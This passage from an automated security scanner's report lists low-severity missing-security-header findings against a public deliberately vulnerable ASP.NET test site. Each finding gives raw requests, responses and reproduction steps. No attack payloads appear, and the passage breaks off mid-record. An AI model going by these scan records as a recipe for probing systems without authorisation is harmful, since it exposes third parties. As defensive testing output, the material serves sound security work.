    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTEwNTI0MjkwNQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZArjxDMCoNA8%2F4bzlRmUHIna4LG5&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEWVwLpus%2FwCALi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBOADTL8%2F1D30ovyktck2hrroq87L
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 12502
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:36 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>acublog news</title>\x0d
    		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [57 more lines, 4204 chars total]
  elapsed_ms: 509.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/default.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASPNET F07] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/login.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-75887c18 (exactly as issued by the engine) ---
  GET /login.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13400
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:00 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>login</title>\x0d
    		<meta name="vs_showGrid" content="True">\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 493.4
  --- RAW REQUEST req-3accfee0 (exactly as issued by the engine) ---
  POST /login.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2BQ8XadeewSqHhJbH9z4dvJw%3D%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEWWwLoz%2FfGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDALi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBBA5zuroos8GeQOELGaDp6VnaRLG&tbUsername=&tbPassword=&cbPersistCookie=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13382
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:25:24 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>login</title>\x0d
    		<meta name="vs_showGrid" content="True">\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 479.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/login.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASPNET F08] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/Signup.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-34addc4d (exactly as issued by the engine) ---
  GET /Signup.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13085
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:02 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Signup</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 532.0
  --- RAW REQUEST req-9272de1b (exactly as issued by the engine) ---
  POST /Signup.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2Bi81I&__VIEWSTATEGENERATOR=36F90C25&__EVENTVALIDATION=%2FwEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQLi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBAjHNjOJsOhDVpmIl0cP5avjE8wS&tbUsername=&tbPassword=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13085
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:26:37 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Signup</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 508.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/Signup.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASPNET F09] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/rssFeed.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-8f1a5bb4 (exactly as issued by the engine) ---
  GET /rssFeed.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2118
    content-type: text/xml; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:03 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <rss version="2.0">\x0d
          <channel>\x0d
            <title>Acunetix testaspnet</title>\x0d
            <link>http://testaspnet.acunetix.com/</link>\x0d
            <description>\x0d
              This is the syndication feed for testaspnet.acunetix.com.\x0d
            </description>\x0d
    \x0d
            <item>\x0d
              <title>Acunetix Vulnerability Scanner Now With Network Security Scans</title>\x0d
              <description>\x0d
    ... [42 more lines, 2279 chars total]
  elapsed_ms: 323.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/rssFeed.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASPNET F10] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/Comments.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0c4e177e (exactly as issued by the engine) ---
  GET /Comments.aspx?id=2
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22881
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:04 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Comments</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 703.7
  --- RAW REQUEST req-d2cf860e (exactly as issued by the engine) ---
  POST /Comments.aspx?id=0
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTg2MjcwMzE2Mg9kFgICAQ9kFgoCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkAgMPFgIfAQVJcG9zdGVkIGJ5IDxzdHJvbmc%2BYWRtaW4gICAgICAgICAgICAgICAgICAgIDwvc3Ryb25nPjUvMTYvMjAxOSAxMjozMjozMCBQTWQCBQ8WBB8BBT5BY3VuZXRpeCBWdWxuZXJhYmlsaXR5IFNjYW5uZXIgTm93IFdpdGggTmV0d29yayBTZWN1cml0eSBTY2Fucx8ABRJSZWFkTmV3cy5hc3B4P2lkPTBkAgcPFgIfAQVEU2VhbWxlc3MgT3BlblZBUyBpbnRlZ3JhdGlvbiBub3cgYWxzbyBhdmFpbGFibGUgb24gV2luZG93cyBhbmQgTGludXhkAgkPZBYCAgEPZBZ4Zg9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAgEPZBYCZg8WAh4FY2xhc3MFB0NvbW1lbnRkAgIPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAgMPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIED2QWAmYPFgIfAwUHQ29tbWVudGQCBQ9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCBg9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAgcPZBYCZg8WAh8DBQdDb21tZW50ZAIID2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAIJD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCCg9kFgJmDxYCHwMFB0NvbW1lbnRkAgsPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAgwPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIND2QWAmYPFgIfAwUHQ29tbWVudGQCDg9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCDw9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAhAPZBYCZg8WAh8DBQdDb21tZW50ZAIRD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAISD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCEw9kFgJmDxYCHwMFB0NvbW1lbnRkAhQPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAhUPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIWD2QWAmYPFgIfAwUHQ29tbWVudGQCFw9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCGA9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAhkPZBYCZg8WAh8DBQdDb21tZW50ZAIaD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAIbD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCHA9kFgJmDxYCHwMFB0NvbW1lbnRkAh0PZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAh4PZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIfD2QWAmYPFgIfAwUHQ29tbWVudGQCIA9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCIQ9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAiIPZBYCZg8WAh8DBQdDb21tZW50ZAIjD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAIkD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCJQ9kFgJmDxYCHwMFB0NvbW1lbnRkAiYPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAicPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIoD2QWAmYPFgIfAwUHQ29tbWVudGQCKQ9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCKg9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAisPZBYCZg8WAh8DBQdDb21tZW50ZAIsD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAItD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCLg9kFgJmDxYCHwMFB0NvbW1lbnRkAi8PZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAjAPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIxD2QWAmYPFgIfAwUHQ29tbWVudGQCMg9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCMw9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAjQPZBYCZg8WAh8DBQdDb21tZW50ZAI1D2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAI2D2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCNw9kFgJmDxYCHwMFB0NvbW1lbnRkAjgPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAjkPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAI6D2QWAmYPFgIfAwUHQ29tbWVudGQCOw9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmRke2IHTIcKpvVhP2S6lzx9jU2NYQ8%3D&__VIEWSTATEGENERATOR=58A73C4D&__EVENTVALIDATION=%2FwEWWQLQ%2FumeCgKAgcfvBQK
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13838
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:27:51 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Comments</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [45 more lines, 4168 chars total]
  elapsed_ms: 535.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/Comments.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASPNET F11] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/ReadNews.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-8fad38b9 (exactly as issued by the engine) ---
  GET /ReadNews.aspx?id=2&NewsAd=ads%2Fdef.html
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 30585
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:13 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 711.9
  --- RAW REQUEST req-6e2ed2b8 (exactly as issued by the engine) ---
  GET /ReadNews.aspx?id=0
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
